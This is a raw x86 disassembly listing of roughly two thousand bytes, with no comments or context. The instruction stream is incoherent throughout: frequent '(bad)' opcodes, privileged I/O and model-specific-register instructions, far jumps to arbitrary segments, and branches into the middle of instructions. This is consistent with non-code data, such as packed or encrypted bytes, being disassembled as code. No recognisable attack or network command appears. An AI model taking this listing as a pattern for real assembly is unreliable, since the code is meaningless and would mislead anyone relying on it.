  413267:	inc    edx
  413268:	xchg   ebx,eax
  413269:	push   ebp
  41326a:	andps  xmm7,xmm0
  41326d:	inc    esp
  41326e:	adc    DWORD PTR [edi],edx
  413270:	popf   
  413271:	jge    0x413284
  413273:	fcmovb st,st(4)
  413275:	fimul  WORD PTR [eax-0x3dea7b43]
  41327b:	(bad)  
  41327e:	mov    eax,0x11f16872
  413283:	(bad)  
  413284:	scas   al,BYTE PTR es:[edi]
  413285:	add    dh,BYTE PTR [ecx+ebp*2]
  413288:	test   eax,0xd379b9d6
  41328d:	into   
  41328e:	dec    ebp
  41328f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413290:	adc    eax,0x9cdae411
  413295:	js     0x4132d2
  413297:	out    dx,al
  413298:	sti    
  413299:	inc    ebp
  41329a:	in     al,dx
  41329b:	repz jle 0x413276
  41329e:	add    bh,BYTE PTR [edx]
  4132a0:	es lods eax,DWORD PTR es:[esi]
  4132a3:	push   ss
  4132a4:	repz mov ds:0x66636636,al
  4132aa:	je     0x413310
  4132ac:	pop    ebx
  4132ad:	fdiv   QWORD PTR [eax-0xe2946c9]
  4132b3:	sti    
  4132b4:	bound  ecx,QWORD PTR [edi]
  4132b6:	repnz popa 
  4132b8:	sub    dl,0xe2
  4132bb:	jno    0x4132da
  4132bd:	xchg   edi,eax
  4132be:	repnz (bad) 
  4132c0:	popf   
  4132c1:	or     eax,0xd002bb1d
  4132c6:	pop    ecx
  4132c7:	in     al,0x43
  4132c9:	fsubp  st(4),st
  4132cb:	jne    0x413330
  4132cd:	mov    ah,0x40
  4132cf:	push   esp
  4132d0:	inc    edx
  4132d1:	or     al,0xc9
  4132d3:	or     bh,BYTE PTR [ecx+0x3]
  4132d6:	mov    cl,0xb2
  4132d8:	jge    0x413296
  4132da:	and    eax,0xb52abd25
  4132df:	push   0x859ca67c
  4132e4:	xor    BYTE PTR [edi+eax*1+0x385e2ad9],bl
  4132eb:	(bad)  
  4132ec:	cmc    
  4132ed:	mov    bh,0x4c
  4132ef:	dec    ebp
  4132f0:	adc    cl,BYTE PTR [ebx+0x7a]
  4132f3:	rcr    BYTE PTR [ebp+ebp*2-0x303c7031],1
  4132fa:	jne    0x413358
  4132fc:	push   0xd96139c5
  413301:	in     eax,dx
  413302:	mov    eax,fs
  413304:	repnz dec esi
  413306:	pop    esi
  413307:	inc    eax
  413308:	mov    ecx,0xbbdacd23
  41330d:	lods   al,BYTE PTR es:[esi]
  41330f:	ins    DWORD PTR es:[edi],dx
  413310:	or     BYTE PTR [edi+edi*4-0xc],bh
  413314:	pusha  
  413315:	and    esp,DWORD PTR [eax-0x7d]
  413318:	xchg   ecx,eax
  413319:	pop    ds
  41331a:	jp     0x4132ce
  41331c:	jo     0x4132f7
  41331e:	cdq    
  41331f:	lahf   
  413320:	cmp    BYTE PTR [ebp-0xd7c26c2],0x3c
  413327:	loop   0x41332f
  413329:	out    dx,eax
  41332a:	pop    edx
  41332b:	inc    edi
  41332c:	sub    DWORD PTR [edx+0x7f9a84eb],0x3a8b61da
  413336:	dec    ah
  413338:	ret    
  413339:	adc    cl,BYTE PTR [ebp+eiz*2+0x5468c72d]
  413340:	call   0xe2a0:0x2e8677f2
  413347:	das    
  413348:	xchg   esp,eax
  413349:	jno    0x413382
  41334b:	pop    eax
  41334c:	jno    0x413391
  41334e:	sbb    BYTE PTR [edx],dh
  413350:	inc    eax
  413351:	inc    ebx
  413352:	pop    edx
  413353:	stos   DWORD PTR es:[edi],eax
  413354:	aad    0xdb
  413356:	jg     0x41331d
  413358:	push   ss
  413359:	arpl   WORD PTR [ecx+0x4a625ee3],di
  41335f:	pop    esi
  413360:	jecxz  0x413350
  413362:	jmp    0xbda18845
  413367:	sub    eax,0xabd9d73a
  41336c:	clc    
  41336d:	sub    BYTE PTR [edx+0x52],bl
  413370:	mov    ds:0x1c1cedd6,al
  413375:	inc    BYTE PTR [esi+0x40be6f6b]
  41337b:	lea    ebx,[ecx+edx*2]
  41337e:	xor    al,0x75
  413380:	xchg   edi,eax
  413381:	in     al,dx
  413382:	or     ebx,ebx
  413384:	gs inc edx
  413386:	add    esp,DWORD PTR [ebx+0x6]
  413389:	idiv   BYTE PTR [edi+0x49]
  41338c:	mov    esp,ecx
  41338e:	mov    BYTE PTR [edi],cl
  413390:	xor    ecx,DWORD PTR [edx+0x70]
  413393:	adc    dh,BYTE PTR [ebx-0x3f]
  413396:	push   0x4502ca64
  41339b:	mov    dh,BYTE PTR [edi+0x74]
  41339e:	cmc    
  41339f:	outs   dx,BYTE PTR ds:[esi]
  4133a0:	mov    al,0x2f
  4133a2:	add    al,0xc8
  4133a4:	mov    eax,0x9bc49f3d
  4133a9:	inc    esp
  4133aa:	mov    BYTE PTR [edx-0x4f],al
  4133ad:	pop    es
  4133ae:	out    0xd1,eax
  4133b0:	mov    esp,0x5e6b249f
  4133b5:	std    
  4133b6:	jmp    0xe131:0x180acab9
  4133bd:	sub    BYTE PTR [ebp+0x1],0xa1
  4133c1:	aas    
  4133c2:	das    
  4133c3:	and    eax,0xe3c406e7
  4133c8:	out    dx,al
  4133c9:	sbb    ecx,DWORD PTR [ecx+ebp*1-0x336405f7]
  4133d0:	sbb    ah,BYTE PTR [esp+edx*2+0x38bbe352]
  4133d7:	mov    ecx,0xcb3e432
  4133dc:	dec    edi
  4133dd:	mov    ebp,0x8f87c715
  4133e2:	fnstcw WORD PTR [edi-0x68]
  4133e5:	inc    ebx
  4133e6:	pop    edi
  4133e7:	and    dl,ch
  4133e9:	(bad)  
  4133eb:	stc    
  4133ec:	(bad)  
  4133ed:	ja     0x4133f0
  4133ef:	lahf   
  4133f0:	sbb    esp,DWORD PTR [edi]
  4133f2:	std    
  4133f3:	shl    BYTE PTR ds:0x594543d7,0x81
  4133fa:	retf   
  4133fb:	xchg   esp,esi
  4133fd:	xlat   BYTE PTR ds:[ebx]
  4133fe:	fisub  WORD PTR [esi-0x64c7db68]
  413404:	xor    DWORD PTR [ebp-0x10],ebp
  413407:	push   ebp
  413408:	outs   dx,BYTE PTR ds:[esi]
  413409:	cmp    ebx,DWORD PTR [edx+edx*2-0x7b]
  41340d:	mov    eax,ss:0xb4f766ce
  413413:	mov    al,ds:0x54f41bdb
  413418:	push   esp
  413419:	das    
  41341a:	or     eax,0x5e030ec9
  41341f:	mov    bl,BYTE PTR [edx]
  413421:	push   ds
  413422:	outs   dx,DWORD PTR ds:[esi]
  413423:	sahf   
  413424:	cmc    
  413425:	in     eax,dx
  413426:	mov    dh,0xe8
  413428:	lods   eax,DWORD PTR ds:[esi]
  413429:	mov    BYTE PTR [edx+eax*4-0x61],ah
  41342d:	scas   eax,DWORD PTR es:[edi]
  41342e:	jnp    0x41346e
  413430:	outs   dx,DWORD PTR ds:[esi]
  413431:	sub    bh,dl
  413433:	retf   
  413434:	popa   
  413435:	inc    ecx
  413436:	push   ds
  413437:	sub    DWORD PTR [edi-0x1b59007a],ebp
  41343d:	mov    ds:0xc42df4a0,al
  413442:	ror    BYTE PTR [edx-0x45],cl
  413445:	or     BYTE PTR [esi],0x1f
  413448:	jo     0x41342f
  41344a:	cmc    
  41344b:	aam    0x1
  41344d:	(bad)  
  41344e:	lock jo 0x4134bd
  413451:	mov    ecx,0x420f313b
  413456:	sbb    al,0xe9
  413458:	shl    BYTE PTR [ebx],0xd3
  41345b:	jecxz  0x41347b
  41345d:	mov    esi,0x96c232c7
  413462:	adc    BYTE PTR [edi+0x1a],0xc6
  413466:	sbb    esp,DWORD PTR [eax+edi*4]
  413469:	cmp    al,0x23
  41346b:	sub    BYTE PTR [esi],0x8a
  41346e:	frstor [esi]
  413470:	sub    eax,0x8781830d
  413475:	call   0x3073:0x3c2b4df6
  41347c:	fisttp WORD PTR [ebx+0x2fc401f5]
  413482:	mov    DWORD PTR [eax],edi
  413484:	sbb    BYTE PTR [esi],dl
  413486:	or     eax,0xd87ed9c
  41348b:	sti    
  41348c:	pusha  
  41348d:	lds    ebp,FWORD PTR [ebx+0x73]
  413490:	stc    
  413491:	push   cs
  413492:	xor    eax,0x5b786c8f
  413497:	jo     0x4134f6
  413499:	ret    
  41349a:	mov    cl,0x56
  41349c:	adc    eax,ebp
  41349e:	inc    ecx
  41349f:	enter  0x9f4b,0x5c
  4134a3:	test   al,0xa9
  4134a5:	jmp    0x106c9252
  4134aa:	inc    ebp
  4134ab:	dec    edi
  4134ac:	xchg   edx,eax
  4134ad:	retf   
  4134ae:	aam    0xb7
  4134b0:	xchg   edi,eax
  4134b1:	fisubr WORD PTR [eax]
  4134b3:	sub    eax,DWORD PTR [eax]
  4134b5:	sar    DWORD PTR [esi-0x73],cl
  4134b8:	jo     0x41347e
  4134ba:	dec    edx
  4134bb:	xor    ch,BYTE PTR [ebx+edi*2-0x2eb6f5a2]
  4134c2:	pop    es
  4134c3:	jbe    0x4134f9
  4134c5:	xor    esi,DWORD PTR [edx]
  4134c7:	push   ecx
  4134c8:	mov    dh,0x9e
  4134ca:	jns    0x413514
  4134cc:	mov    al,0x4
  4134ce:	fst    QWORD PTR [edx-0x9]
  4134d1:	jbe    0x413505
  4134d3:	jmp    0xe34ad37e
  4134d8:	pop    esi
  4134d9:	and    al,0x1e
  4134db:	adc    al,0xe6
  4134de:	call   0x36b3:0xd3cc4c51
  4134e5:	lahf   
  4134e6:	cmp    ch,BYTE PTR [edx-0x3d]
  4134e9:	cld    
  4134ea:	xchg   BYTE PTR [esi-0x10],bh
  4134ed:	std    
  4134ee:	push   es
  4134ef:	jmp    0x8026cd2b
  4134f4:	in     al,0xe6
  4134f6:	dec    eax
  4134f7:	in     al,dx
  4134f8:	dec    ebx
  4134f9:	scas   al,BYTE PTR es:[edi]
  4134fa:	dec    edx
  4134fb:	test   al,0x9f
  4134fd:	push   edi
  4134fe:	(bad)  
  4134ff:	daa    
  413500:	iret   
  413501:	(bad)  
  413503:	in     eax,dx
  413504:	xchg   esi,eax
  413505:	push   0xf7d31edf
  41350a:	cmp    al,0x21
  41350c:	test   eax,0xa4d073c9
  413511:	xlat   BYTE PTR ds:[ebx]
  413512:	daa    
  413513:	mov    eax,ds:0xe6931c10
  413518:	ins    BYTE PTR es:[edi],dx
  413519:	xlat   BYTE PTR ds:[ebx]
  41351a:	imul   edx,edx,0xa2354614
  413520:	sub    ebp,edx
  413522:	pop    ebp
  413523:	inc    edx
  413524:	call   0xa864b46a
  413529:	adc    BYTE PTR [esi-0x74],bh
  41352c:	sbb    al,0x7d
  41352e:	or     al,0x67
  413530:	sub    ch,BYTE PTR [edx]
  413532:	(bad)  
  413533:	in     eax,dx
  413534:	dec    cx
  413536:	rcr    DWORD PTR [edx-0x43293323],cl
  41353c:	mov    al,ds:0x7c2f215e
  413541:	jnp    0x413571
  413543:	popf   
  413544:	pop    esi
  413545:	push   ecx
  413546:	mov    dh,0x4d
  413548:	lods   al,BYTE PTR ds:[esi]
  413549:	and    edx,ebx
  41354b:	adc    eax,DWORD PTR [ebx-0x10]
  41354e:	add    DWORD PTR [esi],esi
  413550:	mov    ah,0xb4
  413552:	push   esp
  413553:	aaa    
  413554:	sub    bh,ah
  413556:	pop    edx
  413557:	rol    DWORD PTR [ecx],0x62
  41355a:	cld    
  41355b:	cmp    edx,DWORD PTR [esi+edx*8+0x57074e54]
  413562:	mov    esi,0x44c71778
  413567:	push   cs
  413568:	cmp    al,0xa0
  41356a:	call   0x41ea:0xac769b1a
  413571:	push   esp
  413572:	mov    ds:0x719363d4,eax
  413577:	xchg   esp,eax
  413578:	pop    ds
  413579:	mov    fs,WORD PTR [edx-0x3e7be38]
  41357f:	scas   al,BYTE PTR es:[edi]
  413580:	xchg   esp,eax
  413581:	push   ebp
  413582:	jmp    0xe0c5f955
  413587:	in     eax,0xb1
  413589:	mov    cl,0x9a
  41358b:	sbb    BYTE PTR [ecx],bl
  41358d:	popa   
  41358e:	dec    edx
  41358f:	add    al,0xfc
  413591:	xchg   DWORD PTR [ebp-0x30],eax
  413594:	imul   edi,DWORD PTR [edi+0x61d48d86],0x5124f12f
  41359e:	jmp    0x4135ab
  4135a0:	jle    0x41359a
  4135a2:	iret   
  4135a3:	or     BYTE PTR [ecx+0x63],ah
  4135a6:	jecxz  0x41357a
  4135a8:	cmp    edx,DWORD PTR [esp+ecx*8-0x5f3271b5]
  4135af:	test   BYTE PTR [ebx],bl
  4135b1:	aas    
  4135b2:	in     eax,0xf3
  4135b4:	ss xor bh,al
  4135b7:	gs repnz sub al,0x70
  4135bb:	fsub   DWORD PTR [edi+ecx*2+0x1d]
  4135bf:	inc    ebp
  4135c0:	icebp  
  4135c1:	xchg   ebp,eax
  4135c2:	dec    ebx
  4135c3:	and    cl,BYTE PTR [eax-0x1e]
  4135c6:	nop
  4135c7:	cmp    esp,DWORD PTR [esi+edi*1+0x667b6898]
  4135ce:	dec    eax
  4135cf:	pop    esp
  4135d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135d1:	adc    dh,ch
  4135d3:	(bad)  
  4135d4:	xchg   ecx,eax
  4135d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135d6:	dec    edx
  4135d7:	inc    eax
  4135d8:	ds jno 0x413602
  4135db:	les    esi,FWORD PTR [edx+ebp*8+0x7cdbc780]
  4135e2:	inc    ecx
  4135e3:	jb     0x413648
  4135e5:	arpl   WORD PTR [ebp-0x44f72e41],cx
  4135eb:	xlat   BYTE PTR ds:[ebx]
  4135ec:	dec    esp
  4135ed:	cmp    al,0x3f
  4135f0:	adc    al,dh
  4135f2:	add    eax,0xeb229573
  4135f7:	mov    ebx,0x36ebc02f
  4135fc:	cmp    ebp,DWORD PTR [edi+ebx*2+0x6bbb58d4]
  413603:	(bad)  
  413605:	aad    0x24
  413607:	arpl   WORD PTR [edi+0x10739991],sp
  41360d:	sbb    BYTE PTR [eax],0xc7
  413610:	add    eax,0x44ce396a
  413615:	fbstp  TBYTE PTR [ecx+0x49]
  413618:	in     al,dx
  413619:	mov    ebx,0xc4ec040
  41361e:	lahf   
  41361f:	outs   dx,DWORD PTR ds:[esi]
  413620:	sub    eax,0xa7a5acca
  413625:	and    cl,bl
  413627:	ret    0xfc39
  41362a:	sub    al,0x16
  41362c:	ret    0xec09
  41362f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413630:	push   edx
  413631:	rol    edi,1
  413633:	(bad)  
  413634:	aam    0xcc
  413636:	add    BYTE PTR [eax],dl
  413638:	(bad)  
  413639:	imul   esp,DWORD PTR ds:0x5aef404c,0x4d935683
  413643:	addr16 dec ebp
  413645:	mov    esi,0xcfc2b6ee
  41364a:	inc    esp
  41364b:	sbb    BYTE PTR [edx],cl
  41364d:	daa    
  41364e:	mov    ah,0x87
  413650:	dec    ebp
  413651:	xor    BYTE PTR [edi],bl
  413653:	jmp    0x1a40a626
  413658:	mov    ebx,0x506e7716
  41365d:	enter  0x3406,0xe6
  413661:	cmc    
  413662:	jge    0x413638
  413664:	xchg   BYTE PTR [edi+0x61],bl
  413667:	xlat   BYTE PTR ds:[ebx]
  413668:	xor    al,0xb5
  41366a:	sub    BYTE PTR [eax+0x43eb4b82],ah
  413670:	loop   0x41366f
  413672:	mov    DWORD PTR [edx],0x7afd0756
  413678:	jge    0x4136b0
  41367a:	stos   BYTE PTR es:[edi],al
  41367b:	add    al,0xd6
  41367d:	push   es
  41367e:	rol    ebx,1
  413680:	and    al,0xcc
  413682:	nop
  413683:	sti    
  413684:	leave  
  413685:	cli    
  413686:	inc    edx
  413687:	mov    ebx,0x1ae432e4
  41368c:	inc    esp
  41368d:	mov    al,ds:0x103dc828
  413692:	test   eax,0xe2f7f436
  413697:	mov    fs,WORD PTR [eax]
  413699:	jge    0x4136a4
  41369b:	jg     0x4136e3
  41369d:	mov    ds:0x369b0e9a,eax
  4136a2:	mov    esi,0x69c0ea9f
  4136a7:	lods   eax,DWORD PTR ds:[esi]
  4136a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136a9:	fstp   DWORD PTR [esi+0xb2a7ec5]
  4136af:	lods   eax,DWORD PTR ds:[esi]
  4136b0:	xor    ebp,DWORD PTR [edi]
  4136b2:	jmp    0x1a3d:0x806ed97c
  4136b9:	lods   eax,DWORD PTR ds:[esi]
  4136ba:	hlt    
  4136bb:	hlt    
  4136bc:	push   cs
  4136bd:	xchg   ebp,eax
  4136be:	mov    ebp,0x15dc4278
  4136c3:	cmp    BYTE PTR [eax+0xa],cl
  4136c6:	dec    edi
  4136c7:	sbb    al,0xba
  4136c9:	add    ebx,eax
  4136cb:	pop    edx
  4136cc:	test   BYTE PTR [ebx],dl
  4136ce:	xlat   BYTE PTR ds:[ebx]
  4136cf:	call   0xb497:0x48f58915
  4136d6:	push   ds
  4136d7:	and    bl,BYTE PTR [edi+0x38e5a1b5]
  4136dd:	push   edx
  4136de:	js     0x4136b6
  4136e0:	stc    
  4136e1:	mov    edx,0xd7e87fde
  4136e6:	retf   
  4136e7:	aam    0xae
  4136e9:	addr16 add eax,0xc5f28fa3
  4136ef:	int3   
  4136f0:	push   edx
  4136f1:	xor    ah,BYTE PTR [ecx+0x205ec8e]
  4136f7:	or     eax,0x30973046
  4136fc:	inc    ebp
  4136fd:	mov    WORD PTR [ecx+edi*4+0xb],ss
  413701:	push   ss
  413702:	push   ds
  413703:	mov    ds:0x23bc5b81,al
  413708:	stos   DWORD PTR es:[edi],eax
  413709:	std    
  41370a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41370b:	call   0x9f59f362
  413710:	xchg   BYTE PTR [esi],dh
  413712:	call   0x7140e98a
  413717:	sbb    DWORD PTR [ebp+0x4611d899],ebp
  41371d:	fstp   st(1)
  41371f:	cmc    
  413720:	add    edx,DWORD PTR [ebp-0x2dfa8fae]
  413726:	push   cs
  413727:	and    edx,DWORD PTR [edi+0x38bb8560]
  41372d:	dec    edi
  41372e:	popa   
  41372f:	fcom   QWORD PTR [edi+0x2e9ba8e0]
  413735:	ins    BYTE PTR es:[edi],dx
  413736:	adc    DWORD PTR ds:0x1abac1f0,0x65
  41373d:	add    al,0x45
  41373f:	imul   edx,DWORD PTR [eax-0x7e],0x5e
  413743:	ret    0x2226
  413746:	je     0x413797
  413748:	int3   
  413749:	adc    eax,0xa3b44587
  41374e:	xchg   ecx,eax
  41374f:	icebp  
  413750:	fdecstp 
  413752:	fcomp  DWORD PTR [esi]
  413754:	cmp    al,0x2
  413756:	stos   DWORD PTR es:[edi],eax
  413757:	or     eax,0xd7adba23
  41375c:	mov    cl,0xc1
  41375e:	sub    DWORD PTR [ebx+eiz*1+0x480e826c],edi
  413765:	pop    esi
  413766:	retf   
  413767:	jae    0x41370b
  413769:	rcr    DWORD PTR [eax+0x64471408],0x29
  413770:	and    eax,0xe112e6d7
  413775:	push   eax
  413776:	ret    
  413777:	test   eax,0xea3e5434
  41377c:	out    0xaa,eax
  41377e:	jge    0x413743
  413780:	div    DWORD PTR [ebx]
  413782:	(bad)  
  413783:	cmc    
  413784:	ins    BYTE PTR es:[edi],dx
  413785:	pop    esi
  413786:	popa   
  413787:	sti    
  413788:	sbb    ebx,esi
  41378a:	inc    edx
  41378b:	mov    edx,0x96bf614b
  413790:	mov    esi,0x6e8fe006
  413795:	lea    eax,[ebx+0x6bcd0ade]
  41379b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41379c:	int3   
  41379d:	add    al,0xbb
  41379f:	pop    esi
  4137a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137a1:	xor    eax,0x20919936
  4137a6:	loopne 0x41380e
  4137a8:	jmp    0x2030:0xf76a535
  4137af:	and    DWORD PTR [eax-0x17],esp
  4137b2:	push   eax
  4137b3:	loope  0x4137f4
  4137b5:	shl    BYTE PTR [edx-0x696165ad],cl
  4137bb:	mov    al,0xc0
  4137bd:	inc    edx
  4137be:	aaa    
  4137bf:	push   es
  4137c0:	pop    esi
  4137c1:	in     al,0xec
  4137c3:	ficom  WORD PTR [esi]
  4137c5:	mov    cl,0xf7
  4137c7:	jmp    0xad774384
  4137cc:	pop    ebp
  4137cd:	aam    0x1d
  4137cf:	mov    WORD PTR [edi-0x2a530d6a],?
  4137d5:	pusha  
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	in     eax,dx
  4137d8:	out    0x3a,al
  4137da:	pushf  
  4137db:	retf   0x5a99
  4137de:	jg     0x413782
  4137e0:	inc    eax
  4137e1:	push   esi
  4137e2:	cmc    
  4137e3:	push   esi
  4137e4:	adc    al,0xc0
  4137e6:	cmp    BYTE PTR [esi-0x123c67ee],cl
  4137ec:	ss call 0xaaa7c25d
  4137f2:	xlat   BYTE PTR ds:[ebx]
  4137f3:	mov    BYTE PTR [edi-0x235a01a3],dh
  4137f9:	dec    ebp
  4137fa:	inc    BYTE PTR ds:0x361721ce
  413800:	or     al,0x70
  413802:	int    0xe2
  413804:	or     DWORD PTR [edx-0x80],esi
  413807:	or     edx,DWORD PTR [edx-0x7b]
  41380a:	and    BYTE PTR [bx+si+0x32a3],0x3e
  413810:	scas   eax,DWORD PTR es:[edi]
  413811:	aas    
  413812:	cs mov esi,0x6894bc36
  413818:	xchg   esp,eax
  413819:	mov    ch,0x7c
  41381b:	sti    
  41381c:	mov    ds:0xf16652be,eax
  413821:	inc    edi
  413822:	sub    DWORD PTR [ebx+edx*1-0x4a],edi
  413826:	outs   dx,DWORD PTR ds:[esi]
  413827:	jl     0x41381d
  413829:	pop    esi
  41382a:	ja     0x41384a
  41382c:	sub    ah,bh
  41382e:	daa    
  41382f:	dec    ecx
  413830:	imul   esi,DWORD PTR [esi+0x444fe4ef],0xffffffd1
  413837:	pop    edi
  413838:	xor    BYTE PTR [ecx-0x1bae2af9],0x3a
  41383f:	cmp    BYTE PTR [ecx+0x1a],0x28
  413843:	mov    ebx,0x454a7fef
  413848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413849:	iret   
  41384a:	pop    ebx
  41384b:	mov    bh,0x82
  41384d:	mov    bh,0xf4
  41384f:	mov    cl,0xfb
  413851:	imul   ecx,DWORD PTR [edx],0x492f97f1
  413857:	ret    0xd3f1
  41385a:	stc    
  41385b:	arpl   WORD PTR [esi+0x3150abcf],ax
  413861:	adc    dl,BYTE PTR ds:0xe124ab56
  413867:	popa   
  413868:	sub    DWORD PTR [edx+edx*1],esi
  41386b:	int3   
  41386c:	xor    BYTE PTR [ecx-0x146f87d0],al
  413872:	imul   esp,ebx,0xf5118c18
  413878:	imul   esp,ebx,0xffffffdb
  41387b:	dec    ebp
  41387c:	(bad)  
  41387d:	jmp    0xaedcecf0
  413882:	scas   al,BYTE PTR es:[edi]
  413883:	call   0xa82e5aff
  413888:	adc    eax,0x58e16477
  41388d:	call   0x26be:0xfe1e9902
  413894:	xor    al,0x6f
  413896:	adc    al,0x25
  413898:	push   ss
  413899:	loopne 0x41383d
  41389b:	leave  
  41389c:	mov    dh,BYTE PTR [ecx+0x11ce8d0d]
  4138a2:	jle    0x41389f
  4138a4:	mov    ?,WORD PTR [ebp+esi*2+0x71093531]
  4138ab:	add    dl,BYTE PTR [ecx+0x58]
  4138ae:	pop    eax
  4138af:	wrmsr  
  4138b1:	mov    ch,0x95
  4138b3:	sbb    edx,DWORD PTR [ebx-0x1930008a]
  4138b9:	cmp    DWORD PTR ds:[ecx-0x3747db09],0x5c
  4138c1:	int    0x5e
  4138c3:	jns    0x4138d2
  4138c5:	pop    es
  4138c6:	pop    ecx
  4138c7:	or     al,0xd8
  4138c9:	aas    
  4138ca:	xor    BYTE PTR [edi-0x7fa82fed],dl
  4138d0:	mov    edi,0x65e8e5b6
  4138d5:	cmp    eax,0xcea34af
  4138da:	out    0x93,al
  4138dc:	rol    bl,1
  4138de:	sar    DWORD PTR [edx+ecx*2-0x3a290d91],cl
  4138e5:	jae    0x413905
  4138e7:	popa   
  4138e8:	lods   al,BYTE PTR ds:[esi]
  4138e9:	arpl   bp,cx
  4138eb:	ds mov bl,0xcd
  4138ee:	into   
  4138ef:	mov    al,0xd6
  4138f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138f2:	inc    edx
  4138f3:	loope  0x413921
  4138f5:	inc    eax
  4138f6:	dec    ecx
  4138f7:	cmp    DWORD PTR [ecx+0x30],ebx
  4138fa:	fild   WORD PTR [ecx-0x307fb378]
  413900:	xchg   DWORD PTR [ebp-0x33],eax
  413903:	loopne 0x4138dc
  413905:	sbb    DWORD PTR [ecx+0x21],0x42
  413909:	jl     0x413968
  41390b:	fld    DWORD PTR [edx-0x2d]
  41390e:	cs pop esp
  413910:	stos   BYTE PTR es:[edi],al
  413911:	pop    eax
  413912:	repz pop edx
  413914:	and    DWORD PTR [ebp-0x33],edi
  413917:	push   edx
  413918:	retf   0x6634
  41391b:	retf   0xb7dc
  41391e:	jne    0x41393b
  413920:	in     al,0xb9
  413922:	lock xor ecx,ecx
  413925:	pop    ebx
  413926:	fsubr  st(3),st
  413928:	sahf   
  413929:	mov    bh,0xe0
  41392b:	jno    0x4138ff
  41392d:	xchg   ebp,eax
  41392e:	fdivrp st(6),st
  413930:	inc    ecx
  413931:	sub    eax,0xc0effe1c
  413936:	xchg   ebp,eax
  413937:	dec    DWORD PTR [edi-0x189eed21]
  41393d:	push   ecx
  41393e:	dec    ebx
  41393f:	daa    
  413940:	pop    ecx
  413941:	cmp    dh,ch
  413943:	jb     0x413915
  413945:	ror    BYTE PTR [ebx-0x1f09e6e9],cl
  41394b:	lea    edx,[eax]
  41394d:	mov    bh,0xf8
  41394f:	pop    es
  413950:	and    eax,0x9b738547
  413955:	or     edx,ebx
  413957:	out    dx,al
  413958:	mov    ch,0x2e
  41395a:	cmp    al,BYTE PTR [ecx]
  41395c:	xor    cl,dh
  41395e:	pop    edi
  41395f:	mov    ch,0x61
  413961:	mov    al,0x6e
  413963:	es clc 
  413965:	not    BYTE PTR [ebx]
  413967:	adc    al,0x21
  413969:	push   0x3ba2a550
  41396e:	pop    edi
  41396f:	sti    
  413970:	fnstsw WORD PTR [edx]
  413972:	(bad)  
  413973:	mov    ecx,0xf870207f
  413978:	jg     0x4139e8
  41397a:	repnz mov dh,0xce
  41397d:	hlt    
  41397e:	mov    al,0x33
  413980:	out    0xf4,al
  413982:	push   ss
  413983:	and    dh,BYTE PTR [ebx-0x6d]
  413986:	and    esp,DWORD PTR [ecx+0x7d6a7b9e]
  41398c:	push   edx
  41398d:	pop    esp
  41398e:	xlat   BYTE PTR ds:[ebx]
  41398f:	jmp    0x413939
  413991:	mov    cl,0xc3
  413993:	push   ecx
  413994:	and    BYTE PTR [ebx+0x76],dl
  413997:	inc    edx
  413998:	(bad)  
  413999:	jge    0x413a18
  41399b:	or     al,0x1c
  41399d:	call   0xcab3364c
  4139a2:	pop    ebx
  4139a3:	cmp    edi,DWORD PTR [eax]
  4139a5:	rcl    esp,cl
  4139a7:	popa   
  4139a8:	adc    al,0xa6
  4139aa:	nop
  4139ab:	push   es
  4139ac:	(bad)  
  4139ad:	adc    ebp,DWORD PTR [eax-0x3756b54e]
  4139b3:	adc    DWORD PTR [eax-0x5ec6bd97],eax
  4139b9:	test   DWORD PTR [ecx],ebp
  4139bb:	push   ebx
  4139bc:	aam    0xa2
  4139be:	dec    esi
  4139bf:	cmc    
  4139c0:	push   ebp
  4139c1:	jns    0x413a2a
  4139c3:	jne    0x413a0b
  4139c5:	jmp    0x5224:0xa3e197a7
  4139cc:	int    0xad
  4139ce:	shl    BYTE PTR [esi-0x3479b033],0x8f
  4139d5:	ins    DWORD PTR es:[edi],dx
  4139d6:	daa    
  4139d7:	mov    esi,0xd9edd049
  4139dc:	pop    ds
  4139dd:	jle    0x4139ad
  4139df:	xchg   esi,eax
  4139e0:	adc    BYTE PTR [edx-0x3f],cl
  4139e3:	push   ecx
  4139e4:	pop    ss
  4139e5:	pop    ds
  4139e6:	pop    es
  4139e7:	or     eax,0xd09039b4
  4139ec:	fcomp  QWORD PTR [edi-0x59]
  4139ef:	cli    
  4139f0:	pop    eax
  4139f1:	adc    DWORD PTR [ebx+ebp*2-0x470ad7e1],0xd
  4139f9:	adc    al,0x6d
  4139fb:	mov    WORD PTR [edx+0x41],?
  4139fe:	jmp    0x65c621c4
  413a03:	popf   
  413a04:	aas    
  413a05:	fs xor eax,0x36b44fec
  413a0b:	dec    ebp
  413a0c:	mov    edx,0xceebcfdd
  413a11:	fistp  QWORD PTR [ecx-0x1f6a5c83]
  413a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a18:	scas   al,BYTE PTR es:[edi]
  413a19:	push   ebp
  413a1a:	push   esi
  413a1b:	addr16 into 
  413a1d:	in     eax,0xe0
  413a1f:	xchg   ebp,eax
  413a20:	repnz or edx,DWORD PTR [ebx]
  413a23:	adc    eax,0x1fe2a45
  413a28:	or     esp,DWORD PTR [edx-0x7c702be4]
  413a2e:	add    eax,0x37ce0303
  413a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a34:	push   edx
  413a35:	xchg   ebp,eax
  413a36:	aam    0xda
  413a38:	mov    al,ds:0xc3138613
  413a3d:	pop    ecx
  413a3e:	dec    esp
  413a3f:	mov    esi,0x7ee23ae3
  413a44:	xchg   edi,eax
  413a45:	jg     0x413a20
  413a47:	js     0x4139cb
  413a49:	push   eax
  413a4a:	jae    0x413ab4
  413a4c:	jns    0x4139d0
  413a4e:	div    DWORD PTR [esi+0x3d776aeb]
  413a54:	fnstcw WORD PTR [ecx+0x7e]
  413a57:	mov    dl,0x1c
  413a59:	aad    0xb3
  413a5b:	inc    ebx
  413a5c:	popa   
  413a5d:	mov    dh,0x53
  413a5f:	dec    ebx
